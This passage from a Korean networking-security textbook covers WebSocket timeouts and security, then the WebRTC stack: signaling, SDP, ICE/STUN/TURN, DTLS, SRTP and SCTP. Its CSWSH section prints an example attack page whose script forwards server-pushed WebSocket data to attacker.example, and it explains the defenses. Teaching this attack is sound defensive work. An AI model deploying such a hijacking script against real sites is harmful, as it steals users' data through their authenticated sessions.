HTTP는 짧고 폭발적인 전송에 최적화되어 있다. 그래서 많은 서버·프록시·중간자가 **유휴 HTTP 커넥션을 공격적으로 타임아웃한다** — 장수명 WebSocket 세션에 정확히 반대되는 동작이다. 고려할 세 지점은 (a) 자기 네트워크 안의 라우터·로드밸런서·프록시, (b) 외부망의 투명·명시적 프록시(ISP·통신사), (c) 클라이언트 네트워크 안의 라우터·방화벽·프록시다. 이 중 (c)는 통제할 수 없다 — 어떤 네트워크는 WebSocket 트래픽을 아예 차단하므로 폴백 전략이 필요할 수 있다. (b)도 통제 밖이지만, 여기서 TLS가 돕는다. **종단 간 보안 커넥션으로 터널링하면 WebSocket 트래픽이 중간 프록시들을 우회한다.**

자기가 배포·관리하는 (a)는 명시적 튜닝이 필요하다. 예컨대 Nginx는 WebSocket을 프록시할 수 있으나 기본 60초 타임아웃을 쓰므로, 명시적으로 늘려야 한다.

```
location /websocket {
    proxy_pass http://backend;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_read_timeout 3600;
    proxy_send_timeout 3600;
}
```

여기서 이 책의 관점으로 짚어 둘 것이 있다. **장수명·유휴 세션은 모든 중간 서버의 메모리와 소켓 자원을 점유한다.** 그래서 짧은 타임아웃은 종종 보안·자원·운영상의 예방책으로 정당화된다. 장수명 세션에 의존하는 WebSocket·SSE·HTTP/2를 배포하는 일은 그 자체로 새로운 운영상 도전 — 그리고 자원 소진(DoS) 표면 — 을 들여온다. 롱 폴링이 서버에 요청당 스레드를 점유시키던 문제(→ 34.9)가, 여기서는 커넥션당 자원 점유로 나타난다.

## 37.7 WebSocket 보안 — Origin 검증, 인증 전달, 하이재킹, 프록시 통과

이 절이 이 장의 중심이다. 앞의 세 절이 서술한 WebSocket의 성질 — 핸드셰이크가 HTTP다, `Origin`과 쿠키가 자동으로 붙는다, 업그레이드 후 커넥션이 HTTP 통제의 시야를 벗어난다 — 이 각각 하나의 취약 구조가 된다. 넷을 차례로 다룬다.

### 37.7.1 Origin 헤더 — 브라우저가 넣지만, 서버가 검증하지 않으면 무의미하다

브라우저는 WebSocket 업그레이드 요청에 `Origin` 헤더를 자동으로 붙인다(→ 37.5). 이 헤더의 보안적 기능은 명확하다. **요청의 출처를 식별한다.** 그러나 이 헤더가 방어가 되려면 조건이 하나 있다. **서버가 그것을 검증해야 한다.**

이것이 이 절에서 가장 반복해서 오해되는 지점이다. `Origin`은 브라우저가 넣어 주는 값이므로, 브라우저 안에서 스크립트가 그것을 위조할 수는 없다 — 34.1절이 다룬 출처 계산이 브라우저에 의해 강제되기 때문이다. 그래서 **서버가 `Origin`을 검사하면**, 크로스 오리진 페이지가 사용자의 브라우저를 통해 여는 핸드셰이크를 걸러낼 수 있다. 서버가 검사하지 않으면, 핸드셰이크가 위조된 것인지 알 길이 없다. 허가되지 않은 출처의 핸드셰이크에는 `101 Switching Protocols`가 아니라 **`403 Forbidden`** 을 돌려줘야 한다.

그러나 결정적 단서가 붙는다. **`Origin`은 브라우저라는 문맥 안에서만 신뢰할 수 있는 값이다.** 8.6절이 헤더의 신뢰성을 다룰 때 세운 원칙이 그대로 적용된다. `Origin`은 브라우저가 강제하는 헤더이지만, **비브라우저 클라이언트는 그것을 임의의 값으로 채워 보낼 수 있다.** curl로, 스크립트로, 전용 WebSocket 클라이언트로 핸드셰이크를 만드는 자는 `Origin: http://books.example.com`을 마음대로 쓴다. 따라서 `Origin` 검증은 **"사용자의 브라우저가 악성 사이트에 속아 핸드셰이크를 열게 하는" 시나리오(CSWSH)를 막는 방어**이지, "임의의 인터넷 클라이언트가 서버에 연결하는 것"을 막는 방어가 아니다. 후자를 막는 것은 인증이다. `Origin` 검증과 인증은 서로 다른 위협을 막으며, 어느 하나가 다른 하나를 대체하지 못한다.

검증에도 함정이 있다. 어설픈 검사는 우회된다(→ 33.7). `books.example.com`만 허용하되 **문자열 포함 여부**로 판단하면, 공격자는 `books.example.com.attacker.net` 같은 도메인을 만들어 통과시킨다. `Origin`은 문자열 포함이 아니라 **출처 전체(스킴·호스트·포트 삼중항)가 정확히 일치하는지**로 검증해야 한다. 이 정확한 형태가 34.1절이 출처를 어떻게 계산하는지 다룬 곳에서 온다.

### 37.7.2 인증 전달 — 핸드셰이크가 HTTP이므로 쿠키가 자동으로 붙는다

WebSocket 핸드셰이크는 HTTP 요청이다. 그러므로 **브라우저는 대상 도메인의 쿠키를 이 핸드셰이크에 자동으로 첨부한다.** 이것은 편의이자 함정이다. 편의인 이유는, 초기 HTTP 업그레이드 핸드셰이크가 기존 HTTP 쿠키 메커니즘을 그대로 활용해 사용자를 검증할 수 있기 때문이다 — 검증이 실패하면 서버가 업그레이드를 거절하면 된다.

함정인 이유는 33.7절이 완결한 CSWSH의 뿌리가 바로 이것이기 때문이다. 쿠키가 자동으로 붙는다는 것은, **사용자가 로그인한 상태라면 어떤 페이지가 그 사용자의 브라우저로 여는 WebSocket 핸드셰이크에도 그 인증 쿠키가 붙는다는 뜻이다.** CSRF가 요청에 쿠키를 태워 위조 요청을 성립시켰던 것과 정확히 같은 구조다.

이 함정을 피하는 가장 깔끔한 방법은 **쿠키가 아닌 인증**이다. 인증 토큰(JWT 등)을 헤더로 실어 보내면, 크로스 사이트 컨텍스트에서는 그 헤더를 붙일 수 없으므로 핸드셰이크가 인증에 실패한다. 쿠키의 자동 첨부라는 성질을 아예 제거하는 것이다. 다만 브라우저 WebSocket API는 커스텀 헤더를 임의로 붙이는 것을 허용하지 않으므로, 실무에서는 서브프로토콜 필드나 첫 애플리케이션 메시지로 토큰을 전달하는 우회가 쓰인다.

### 37.7.3 하이재킹 — CSWSH의 완결

33.7절이 CSWSH를 예고하며 "전모는 37.7이 이어받는다"고 남겨 두었다. 여기서 완결한다.

**크로스 사이트 WebSocket 하이재킹(CSWSH)** 은 WebSocket 통신의 핸드셰이크 단계를 겨냥한 CSRF다. 성립 조건은 두 가지의 결합이다. **첫째, 서버가 쿠키 기반 인증을 쓴다** — 그래서 크로스 사이트 핸드셰이크에 인증 쿠키가 자동으로 붙는다. **둘째, 서버가 핸드셰이크에 안티 CSRF 토큰을 요구하지 않고 `Origin`도 검증하지 않는다** — 그래서 위조된 핸드셰이크를 걸러내지 못한다. 이 둘이 만나면, 공격자는 피해자의 인증된 세션으로 WebSocket 연결을 열 수 있다.

CSWSH가 순수 CSRF보다 위험한 이유는 33.7절이 짚은 그대로다. 일반 CSRF는 단방향이다 — 요청만 보내고 응답을 읽지 못한다. **WebSocket은 양방향 채널이다.** 일단 하이재킹된 연결이 열리면, 공격자 코드는 서버가 밀어 보내는 메시지를 읽어서 유출할 수 있다.

```html
<script>
  var ws = new WebSocket('wss://books.example.com/socket');
  ws.onopen = function () {
    ws.send(JSON.stringify({ type: 'subscribe', channel: 'orders' }));
  };
  ws.onmessage = function (event) {
    // 서버가 밀어 보낸 데이터를 공격자 서버로 유출
    fetch('http://attacker.example/?' + encodeURIComponent(event.data),
          { mode: 'no-cors' });
  };
</script>
```

피해자가 이 페이지를 열면, 피해자의 브라우저가 그의 쿠키로 핸드셰이크를 완료하고 채널을 구독한다. 이후 새 데이터가 도착할 때마다 `onmessage`가 그 응답을 공격자 서버로 유출한다. 단방향이라던 CSRF가, 양방향 채널을 타고 데이터 탈취까지 하는 공격이 된다. GraphQL 서브스크립션을 WebSocket으로 구현한 API가 이 공격에 노출되는 것이 그 실례다(→ 33.6, 33.7).

방어는 세 겹이다. **(a) CSWSH도 CSRF이므로 CSRF 방어가 그대로 적용된다** — 핸드셰이크에 안티 CSRF 토큰을 요구한다. **(b) 쿠키가 아닌 인증(37.7.2)을 쓰면** 크로스 사이트 메시지가 인증에 실패한다. **(c) WebSocket 고유의 핵심 방어는 `Origin` 검증(37.7.1)이다** — 정확한 출처 일치로, 문자열 포함으로가 아니라.

### 37.7.4 프록시 통과 — 업그레이드 후에는 HTTP 계층 통제가 적용되지 않는다

마지막 취약 구조는 37.5절의 마지막 문장에서 온다. **핸드셰이크가 성공하면 이후 HTTP 통신은 없고 WebSocket 프로토콜이 커넥션을 넘겨받는다.** 이 사실의 보안적 결과는 두 방향으로 나타난다.

**첫째, 방어자의 HTTP 계층 검사가 무력해진다.** 12.11절이 다룬 웹 애플리케이션 방화벽(WAF)은 HTTP 요청을 파싱해 규칙을 적용한다. 그러나 `101 Switching Protocols` 이후의 트래픽은 HTTP가 아니라 불투명한 WebSocket 프레임이다. **WAF는 핸드셰이크는 검사할 수 있어도, 업그레이드된 커넥션 위로 오가는 메시지는 검사하지 못한다.** 13.12절이 정리한 "중간자가 무엇을 파싱할 수 있는가"의 목록에서, WebSocket 프레임은 대부분의 HTTP 중간자에게 검사 불가 항목이다. 접근 제어, 콘텐츠 필터링, 인젝션 탐지 — HTTP 요청 단위로 걸려 있던 이 모든 통제가 업그레이드 경계에서 끝난다. 커넥션 수립 시점의 단 한 번의 판정만이 남는다는 37.1절의 관찰이, 여기서 방어자 쪽의 손실로 구체화된다.

**둘째, 경로의 비인식 중간자가 오작동한다.** 많은 기존 HTTP 중간자가 WebSocket 프로토콜을 이해하지 못한다. 그 결과는 맹목적 커넥션 업그레이드, WebSocket 프레임의 의도치 않은 버퍼링, 프로토콜을 모른 채 하는 콘텐츠 변형, WebSocket 트래픽을 침해된 HTTP 커넥션으로 오분류하는 것 등이다(→ 9.7, 13.11). Key/Accept 핸드셰이크가 명시적 프록시의 일부 문제는 막지만, **트래픽을 몰래 분석·변형하는 투명 프록시에는 불충분하다**(→ 37.5).

이 두 문제의 공통 처방이 **`wss://`** 다. **HTTP 업그레이드 전에 TLS 세션을 협상하면, 클라이언트와 서버가 암호화된 종단 간 터널을 세운다.** 그러면 경로의 중간자는 커넥션을 열어 볼 수 없으므로, 앞의 문제들이 해소된다. 이것은 13.10절이 다룬 CONNECT 터널의 논리와 같다 — 중간자를 지나되 그것이 내용을 보지 못하게 하는 것이다. 모바일 클라이언트처럼 트래픽이 다양한 프록시를 지나는 경우 특히 그렇다. TLS가 유휴 TCP 커넥션의 타임아웃까지 막지는 못하지만, WebSocket 세션 협상의 성공률을 크게 높이고 커넥션 타임아웃 간격을 늘리는 데도 도움이 된다.

단, `wss://`의 이 통과가 방어자에게는 양날이다. 종단 간 암호화된 WebSocket은 조직 자신의 WAF·검사 중간자도 통과한다. **투명 프록시가 볼 수 없다는 것은, 그 조직의 보안 검사 프록시도 볼 수 없다는 것이다.** 이것이 37.14절 표에서 WebSocket이 "HTTP 계층의 무엇을 우회하는가" 열에 들어가는 이유다.

## 37.8 WebRTC 표준과 오디오·비디오 엔진 — getUserMedia

**Web Real-Time Communication(WebRTC)** 은 표준·프로토콜·JavaScript API의 묶음으로, 브라우저(피어) 사이의 P2P 오디오·비디오·데이터 공유를 가능하게 한다. 제3자 플러그인이나 독점 소프트웨어 없이, 어떤 웹 애플리케이션이든 간단한 API로 실시간 통신을 표준 기능으로 쓸 수 있다. 브라우저는 대부분의 복잡성을 세 개의 주요 API 뒤로 감춘다.

- **MediaStream**: 오디오·비디오 스트림의 획득
- **RTCPeerConnection**: 오디오·비디오 데이터의 통신
- **RTCDataChannel**: 임의의 애플리케이션 데이터의 통신

이 세 API는 빙산의 일각이다. 그 밑에 시그널링, 피어 발견, 커넥션 협상, 보안, 그리고 반 다스의 새 네트워크 프로토콜 계층이 필요하다. WebRTC의 아키텍처는 열두 개가 넘는 표준으로 이뤄진다 — 브라우저 API는 W3C의 WEBRTC 워킹그룹이, 프로토콜·데이터 형식·보안은 IETF의 RTCWEB 워킹그룹이 정의한다.

이 장에서 WebRTC를 다루는 방식을 먼저 밝힌다. **WebRTC의 네트워크 계층은 4장이 이미 세워 두었다.** UDP를 왜 쓰는지(4.2), NAT가 왜 문제인지(4.3), STUN·TURN·ICE가 무엇인지(4.4), DTLS가 왜 TLS가 아닌지(4.8) — 이 모두가 4장의 몫이다. 이 장의 37.9~37.11절은 그것들을 **재설명하지 않고 역참조하며**, WebRTC의 문맥에서 그것들이 어떻게 조립되는지, 그리고 어떤 신뢰 경계를 만드는지에 집중한다.

### getUserMedia와 권한 모델

리치한 화상 회의를 위해서는 브라우저가 시스템 하드웨어에 접근해 오디오와 비디오를 캡처할 수 있어야 한다. Media Capture and Streams 명세의 `getUserMedia()` API가 그 역할을 한다.

```javascript
var constraints = {
  audio: true,
  video: {
    mandatory: { width: { min: 320 }, height: { min: 180 } },
    optional:  [ { width: { max: 1280 } }, { frameRate: 30 } ]
  }
};

navigator.getUserMedia(constraints, gotStream, logError);

function gotStream(stream) {
  var video = document.querySelector('video');
  video.src = window.URL.createObjectURL(stream);
}
```

`getUserMedia()`는 필수·선택 제약을 명시해 필요한 스트림을 획득한다. 획득된 `MediaStream`은 하나 이상의 동기화된 트랙(`MediaStreamTrack`)으로 이뤄지며, 입력원은 마이크·웹캠 같은 물리 장치일 수도, 로컬·원격 파일일 수도 있다.

이 API에서 보안상 결정적인 것은 **권한 모델**이다. `getUserMedia()`는 마이크와 카메라 접근을 **사용자에게 요청**한다. 이것이 34.1절이 세운 출처 개념과 만나는 지점이다. 마이크·카메라 접근 권한은 **출처 단위로** 부여된다. 어떤 출처가 카메라 접근을 얻었다는 것은, 그 출처의 페이지가 사용자의 실세계 — 그의 얼굴, 그의 목소리, 그의 방 — 를 캡처할 수 있게 되었다는 뜻이다. 이것은 이 책이 다룬 어떤 데이터 접근보다 무거운 권한이다. 쿠키나 DOM은 브라우저 안의 데이터였지만, 미디어 스트림은 브라우저 밖의 물리 세계다.

그래서 이 권한은 몇 가지 통제로 감싸인다. 접근은 명시적 사용자 승인을 요구하고, 승인은 출처에 묶이며, 현대 브라우저는 보안 컨텍스트(HTTPS)에서만 이 API를 허용한다. XSS(→ 32장)로 어떤 출처에서 스크립트를 실행할 수 있게 된 공격자에게, 그 출처가 이미 카메라 권한을 얻어 두었다면 무엇이 가능한지를 생각하면 이 권한의 무게가 분명해진다. 미디어 접근 권한을 얻은 출처는, 그 출처의 스크립트 실행 권한이 곧 사용자의 카메라·마이크 접근 권한이 되는 신뢰 경계를 새로 만든다.

## 37.9 실시간 전송과 RTCPeerConnection — 왜 UDP인가

실시간 통신은 시간에 민감하다. 오디오·비디오 스트리밍 애플리케이션은 간헐적 패킷 손실을 견디도록 설계된다 — 코덱이 작은 데이터 공백을 채울 수 있고, 대개 출력 품질에 영향이 거의 없다. **시의적절함과 저지연이 신뢰성보다 중요할 수 있다.**

이것이 UDP가 실시간 데이터 전달에 선호되는 전송 수단인 근본 이유다. 4.2절이 이미 이것을 정확히 세워 두었다. **TCP는 신뢰성 있고 순서가 보장된 스트림을 전달하지만, 중간 패킷이 손실되면 그 뒤 패킷을 전부 버퍼링하고 재전송을 기다린 뒤 순서대로 전달한다.** 실시간 미디어에서는 이 대기가 손실 자체보다 나쁘다. 늦게 도착한 오디오 샘플은 재생 시점이 지나 쓸모가 없다. UDP는 각 패킷을 도착 즉시 애플리케이션에 넘긴다 — IP의 최선 노력 전달에 대한 얇은 래퍼다. 4.1절의 표 1-3이 나열한 UDP의 네 가지 비서비스(전달 보장 없음, 순서 보장 없음, 커넥션 상태 없음, 혼잡 제어 없음)가, 실시간 미디어에서는 결함이 아니라 정확히 원하는 성질이 된다.

**그래서 WebRTC는 다른 모든 브라우저 통신과 달리 데이터를 UDP 위로 나른다.** 그러나 4.8절이 강조했듯 UDP는 출발점일 뿐이다. 원시 UDP만으로는 WebRTC의 요구를 채울 수 없다 — NAT와 방화벽 순회, 스트림 파라미터 협상, 암호화, 혼잡·흐름 제어가 모두 필요하다. 그 조연진이 4.8절이 나열한 스택이다.

### RTCPeerConnection API

이 많은 프로토콜에도 불구하고 애플리케이션 API는 비교적 단순하다. `RTCPeerConnection` 인터페이스가 각 P2P 커넥션의 전체 생명주기를 관리한다. 이것이 NAT 순회를 위한 전체 ICE 워크플로를 관리하고, 피어 사이의 자동 STUN keepalive를 보내고, 로컬·원격 스트림을 추적하고, 필요 시 자동 스트림 재협상을 촉발하고, 커넥션 오퍼 생성·앤서 수락·상태 조회 API를 제공한다.

즉 `RTCPeerConnection`은 커넥션 수립·관리·상태를 하나의 인터페이스로 캡슐화한다. 그러나 그 안을 이해하려면 시그널링과 협상, 오퍼-앤서 워크플로, ICE 순회를 알아야 한다. 다음 절이 그것을 다룬다.

## 37.10 P2P 연결 수립 — 시그널링과 세션 협상, SDP, ICE/STUN/TURN, Trickle ICE

P2P 커넥션을 개시하는 것은 XHR·EventSource·WebSocket을 여는 것보다 훨씬 많은 일을 요구한다. 뒤의 셋은 잘 정의된 HTTP 핸드셰이크에 의존하고, **세 경우 모두 대상 서버가 공개 라우팅 가능한 IP를 가졌거나 클라이언트와 같은 내부망에 있다고 암묵적으로 가정한다.** WebRTC는 이 가정을 쓸 수 없다. 두 피어가 각자 별개의 사설망 안, 하나 이상의 NAT 뒤에 있을 공산이 크다(→ 4.3). 어느 피어도 상대에게 직접 도달하지 못한다.

게다가 HTTP 서버는 항상 새 커넥션을 듣고 있지만, **원격 피어는 그렇지 않다** — 오프라인이거나, 도달 불가이거나, 바쁘거나, 연결할 뜻이 없을 수 있다. 그래서 성공적 P2P 커넥션을 위해서는 세 문제를 먼저 풀어야 한다. (1) 상대 피어에게 연결 의사를 알려 그가 인바운드 패킷을 듣기 시작하게 한다. (2) 양쪽의 잠재적 라우팅 경로를 식별해 서로에게 중계한다. (3) 미디어·데이터 스트림의 파라미터 — 프로토콜, 인코딩 — 를 교환한다.

WebRTC는 (2)를 ICE로 대신 풀어 준다. 그러나 **(1) 알림(시그널링)과 (3) 초기 세션 협상은 애플리케이션의 몫으로 남긴다.**

### 시그널링 — WebRTC가 표준화하지 않은 것

연결성 검사나 세션 협상에 앞서, 상대 피어가 도달 가능한지, 연결할 뜻이 있는지 알아야 한다. **오퍼(offer)** 를 내밀고 피어가 **앤서(answer)** 를 돌려주는 이 교환에는 딜레마가 있다. 상대가 인바운드 패킷을 듣고 있지 않다면 어떻게 의사를 알리는가. 최소한 **공유 시그널링 채널**이 필요하다.

**WebRTC는 시그널링 전송 수단과 프로토콜의 선택을 의도적으로 애플리케이션에 위임한다.** 표준은 시그널링 스택에 대한 어떤 권고도 구현도 제공하지 않는다. 이 위임은 SIP·Jingle·ISUP 같은 기존 통신 인프라의 시그널링 프로토콜과 상호운용하기 위한 것이다. 애플리케이션은 기존 시그널링 게이트웨이를 쓰거나 커스텀 시그널링 서비스를 구현하면 된다. 두 피어가 같은 시그널링 서비스에 연결되어 있으면, 그 서비스가 둘 사이에서 메시지를 왕복시킨다.

이 위임에는 보안적 함의가 있다. **시그널링 채널은 WebRTC의 신뢰 앵커다.** 오퍼-앤서와 ICE 후보가 모두 이 채널을 지난다. 시그널링 채널을 장악한 자는 피어가 교환하는 세션 파라미터를 관측하거나 변조할 수 있고, 잘못된 후보를 주입하거나 연결을 중간자 경로로 유도할 수 있다. 그런데 WebRTC 표준은 이 채널을 정의하지 않으므로, **그 보안은 전적으로 애플리케이션이 책임진다.** 시그널링을 WebSocket이나 SSE로 구현하면(→ 37.13), 그 채널의 보안은 앞 절들이 다룬 WebSocket·SSE 보안 그대로가 된다. 시그널링 채널을 TLS로 보호하지 않으면, 그 위의 모든 WebRTC 협상이 노출된다.

### SDP — 세션 프로파일의 서술

WebRTC는 **세션 서술 프로토콜(Session Description Protocol, SDP)** 로 P2P 커넥션의 파라미터를 서술한다. SDP는 미디어를 나르지 않는다. 교환할 미디어 타입(오디오·비디오·데이터), 네트워크 전송, 사용 코덱과 설정, 대역폭 정보 같은 "세션 프로파일"을 서술한다.

```
m=audio 1 RTP/SAVPF 111 ...
a=candidate:1862263974 1 udp 2113937151 192.168.1.73 60834 typ host ...
a=rtpmap:111 opus/48000/2
```

오퍼-앤서 워크플로는 대칭이다. 개시자(Amy)가 스트림을 등록하고 오퍼를 생성해 자기 "로컬 서술"로 설정한 뒤 시그널링 채널로 보낸다. 상대(Bob)는 그것을 "원격 서술"로 설정하고, 자기 스트림을 등록하고, 앤서를 생성해 자기 "로컬 서술"로 설정한 뒤 Amy에게 되보낸다. Amy가 그 앤서를 자기 "원격 서술"로 설정하면 협상이 끝난다. 애플리케이션은 SDP를 직접 다루지 않는다 — JSEP(JavaScript Session Establishment Protocol)가 그 내부를 몇 개 메서드 호출 뒤로 추상화한다.

### ICE/STUN/TURN — 4장의 재사용

세션 파라미터를 교환한 뒤에도 남는 문제가 연결성 검사와 NAT 순회다. **여기서 4.4절이 세운 STUN·TURN·ICE가 그대로 쓰인다.** 재설명하지 않고 WebRTC 문맥에서 어떻게 조립되는지만 짚는다.

각 `RTCPeerConnection`은 **ICE 에이전트**를 품는다. 로컬 서술이 설정되면 에이전트가 자동으로 후보(candidate) IP·포트 튜플 수집을 시작한다. (1) 운영체제에 로컬 IP를 묻고, (2) 설정되어 있으면 외부 STUN 서버에 공인 IP·포트를 묻고(→ 4.4), (3) 설정되어 있으면 TURN 서버를 최후 수단 후보로 덧붙인다 — P2P가 실패하면 데이터가 이 중계를 통해 간다.

```javascript
var ice = { "iceServers": [
  { "url": "stun:stun.example.com:19302" },
  { "url": "turn:user@turnserver.example", "credential": "pass" }
]};
var pc = new RTCPeerConnection(ice);
```

수집이 끝나면 후보들이 SDP에 담긴다. 후보에는 사설 주소(`typ host`)와 STUN이 돌려준 공인 주소(`typ srflx`)가 섞인다. 원격 후보가 설정되면 ICE 에이전트가 **STUN 바인딩 요청**으로 연결성 검사를 시작한다. 상대가 성공 응답을 하면 P2P 라우팅 경로가 확보된 것이다. 모든 후보가 실패하면 커넥션이 실패로 표시되거나 TURN 릴레이로 폴백한다. ICE 에이전트는 후보를 자동으로 순위 매긴다 — 로컬 주소를 먼저, 그다음 공인, TURN은 최후. 커넥션 수립 후에도 주기적 STUN 요청을 keepalive로 계속 보낸다.

여기서 4.4절이 세운 신뢰 경계가 그대로 상속된다. **STUN·TURN 서버는 두 피어가 서로의 주소를 알기 위해 신뢰하는 제3자다.** 그리고 STUN만으로는 부족해 약 8~10%의 커넥션이 실패하므로 TURN이 필요한데, **TURN을 쓰면 두 피어의 모든 트래픽이 제3자 릴레이를 통과한다**(→ 4.4, 4.8). 1.8절의 중간자 개입 조건이 그 경로에서 자동으로 충족된다. 이것이 37.11절의 DTLS 필수화로 이어지는 직접적 동기다.

### Trickle ICE

ICE 수집은 즉각적이지 않다. 로컬 IP는 빠르지만 STUN 질의는 외부 서버로의 왕복을, 이어 피어 간 STUN 연결성 검사를 요구한다. **Trickle ICE**는 점진적 수집·검사를 허용하는 확장이다. 핵심은 단순하다. 양 피어가 **ICE 후보 없이 먼저 SDP 오퍼를 교환하고**, 후보는 발견되는 대로 시그널링 채널로 흘려보내며, 새 후보가 도착하는 즉시 연결성 검사를 돌린다. 수집 완료를 기다리지 않으므로 커넥션 개시 시간이 크게 단축된다. 시그널링 트래픽은 늘지만, 모든 WebRTC 애플리케이션에 권장되는 전략이다.

## 37.11 미디어와 데이터 전달 — DTLS로 보안 통신, SRTP/SRTCP, SCTP

오퍼-앤서 워크플로와 NAT 순회를 마쳐도, 두 피어가 가진 것은 원시 UDP 커넥션뿐이다 — 아무 장식 없는 데이터그램 전송이다. 흐름 제어, 혼잡 제어, 오류 검사, 대역폭·지연 추정이 없으면 네트워크를 쉽게 압도한다(→ 4.5). 게다가 UDP는 평문으로 데이터를 나르는데, **WebRTC는 모든 통신의 암호화를 필수로 요구한다.** 그래서 WebRTC는 UDP 위에 여러 프로토콜을 얹는다. DTLS로 미디어 키를 협상하고 애플리케이션 데이터를 보안 전송하며, SRTP로 오디오·비디오를, SCTP로 애플리케이션 데이터를 나른다.

### DTLS로 보안 통신 — 왜 TLS가 아닌가

**WebRTC는 모든 전송 데이터 — 오디오·비디오·커스텀 페이로드 — 를 전송 중 암호화해야 한다.** TLS가 완벽히 맞을 것 같지만, TLS는 UDP 위에서 쓸 수 없다. 4.8절이 이미 이 이유를 세워 두었다 — **TLS는 TCP가 제공하는 신뢰성 있고 순서 보장된 전달에 의존하는데, UDP는 그것을 주지 않는다.** 17장·18장이 다룬 TLS는 레코드가 순서대로, 온전하게, 조각나지 않고 도착한다고 가정한다. UDP 위에서는 그 가정이 모두 깨진다.

그래서 WebRTC는 **DTLS(Datagram Transport Layer Security)** 를 쓴다. 4.8절의 표 4-15가 UDP의 각 비서비스에 DTLS가 어떻게 대응하는지 정리했다. 요지만 반복하면, **DTLS는 TLS다** — UDP의 비순서·최선 노력 전달 위에서 동작하도록 최소한의 수정을 가한 것이다. 핸드셰이크 레코드에 명시적 순서 번호와 단편 오프셋을 더하고, 재전송 타이머를 두어 "핸드셰이크만을 위한 미니 TCP"를 구현한다. DTLS 핸드셰이크는 **2왕복**을 요구하며, 이것이 P2P 커넥션 수립에 추가 지연을 더한다(→ 18.2, 4.8).

DTLS가 WebRTC에서 갖는 결정적 성질은 **인증 모델**이다. WebRTC 클라이언트는 각 피어에 대해 **자체 서명(self-signed) 인증서를 자동 생성한다.** 그래서 검증할 인증서 체인이 없다. **DTLS는 암호화와 무결성을 제공하지만, 인증은 애플리케이션에 위임한다**(→ 17.7의 세 문제 구분). 이것이 17장·18장이 다룬 브라우저-서버 TLS와 결정적으로 다른 지점이다. 서버 TLS에서는 CA가 서명한 인증서로 서버의 신원을 검증했다(→ 17.8, 18.3). WebRTC의 DTLS에서는 그런 신뢰 사슬이 없다. **"내가 지금 암호화된 채널로 대화하는 이 피어가 정말 내가 통화하려던 그 사람인가"라는 질문에 DTLS는 답하지 않는다.**

그 답은 애플리케이션이 채워야 한다. 두 방법이 있다. (a) 웹 애플리케이션이 기존 신원 검증 시스템 — 예컨대 로그인 — 으로 WebRTC 세션 수립 전에 사용자를 인증한다. (b) 각 피어가 SDP 오퍼·앤서 생성 시 자기 "신원 제공자(identity provider)"를 명시하고, 상대가 그 제공자에게 받은 인증서를 검증한다. 어느 쪽이든, **암호화(DTLS)와 인증(애플리케이션)이 분리되어 있다는 사실을 이해하지 못하면, "암호화되었으니 안전하다"는 잘못된 결론에 빠진다.** 17.7절이 암호화·인증·무결성이 서로 다른 문제라고 못 박은 것이, 여기서 실물이 된다.

### SRTP/SRTCP — 미디어 전달

WebRTC는 기존 VoIP 인프라가 쓰던 전송 프로토콜을 재사용한다. **SRTP(Secure Real-time Transport Protocol)** 는 오디오·비디오 전달의 보안 프로파일이고, **SRTCP**는 그 제어 채널의 보안 프로파일이다. RTP(RFC 3550)의 "보안 프로파일"(RFC 3711)이라는 뜻에서 앞에 S가 붙는다 — WebRTC가 모든 통신의 암호화를 요구하기 때문이다.

SRTP 패킷은 각각 순서 번호(비순서 전달 검출), 타임스탬프(스트림 동기화), SSRC 식별자(스트림 구분), 그리고 암호화된 미디어 페이로드와 무결성을 검증하는 인증 태그를 나른다. SRTCP는 송수신 바이트·패킷 수, 손실, 지터 등의 통계를 주기적으로 교환해 전송률과 인코딩 품질을 조정한다. 미디어·네트워크 엔진은 이 피드백으로 적응형 스트리밍을 구현한다 — 낮은 비트레이트로 시작해 가용 대역폭에 맞춰 품질을 올린다.

여기서 짚어 둘 설계 결합이 있다. **SRTP와 SRTCP는 페이로드를 암호화하지만, 비밀 키를 협상할 메커니즘이 없다.** 그래서 DTLS 핸드셰이크가 먼저 돌아야 한다 — DTLS가 피어 사이의 공유 비밀을 수립하고, 그것이 SRTP·SRTCP의 키 재료로 재사용된다. 이 순서 의존성이 WebRTC 스택의 골격이다.

### SCTP — 애플리케이션 데이터 전달

SRTP는 미디어 전용이라 애플리케이션 데이터에 맞지 않는다. DataChannel(→ 37.12)은 **SCTP(Stream Control Transmission Protocol)** 에 의존하며, SCTP는 수립된 DTLS 터널 위에서 돈다. SCTP가 요구되는 이유는 표가 명확하다.

**표 37-3. TCP·UDP·SCTP 비교 (HPBN 표 18-1 기준)**

| | TCP | UDP | SCTP |
|---|---|---|---|
| 신뢰성 | 신뢰 | 비신뢰 | **설정 가능** |
| 전달 순서 | 순서 보장 | 비순서 | **설정 가능** |
| 전송 단위 | 바이트 지향 | 메시지 지향 | 메시지 지향 |
| 흐름 제어 | 있음 | 없음 | 있음 |
| 혼잡 제어 | 있음 | 없음 | 있음 |

SCTP는 TCP와 UDP의 장점을 결합한다 — 메시지 지향 API, 설정 가능한 신뢰성·순서, 내장 흐름·혼잡 제어. 여러 독립 스트림을 하나의 association(커넥션)에 다중화하며, 각 메시지는 청크로 쪼개져 전달·재조립된다. 이 구조는 11.7절의 HTTP/2 프레이밍 계층과 개념이 동일하되, SCTP는 그것을 더 낮은 계층에서 구현한다. WebRTC 클라이언트는 부분 신뢰성 확장(RFC 3758)까지 더해, 메시지별로 커스텀 전달 보장을 구현할 수 있게 한다.

한 가지 짚을 것 — **왜 SCTP를 IP 위에서 직접 쓰지 않고 UDP·DTLS 위로 터널링하는가.** 기존 라우터와 NAT 장비가 SCTP를 올바로 다루지 못해, 공개 인터넷에서 "벌거벗은" SCTP를 쓰는 것이 사실상 불가능하기 때문이다. 4.3절이 다룬 NAT의 부작용이 여기서도 프로토콜 선택을 강제한다. 그래서 WebRTC는 SCTP를 UDP와 DTLS 위로 터널링하고, 사용자 공간의 WebRTC 클라이언트가 그것을 구현한다.

> **이 절이 뒷받침하는 것**
>
> - 왜 TLS가 아니라 DTLS인가 → **4.8**(UDP 위의 TLS 전제 붕괴), **17장·18장**(서버 TLS와 대조)
> - 암호화와 인증의 분리 → **17.7**(세 문제 구분), **17.8·18.3**(CA 신뢰 사슬과 대조)
> - SCTP를 IP 위에서 못 쓰는 이유 → **4.3**(NAT의 부작용)

## 37.12 DataChannel — 설정·협상, 순서와 신뢰성, 부분 신뢰 전달

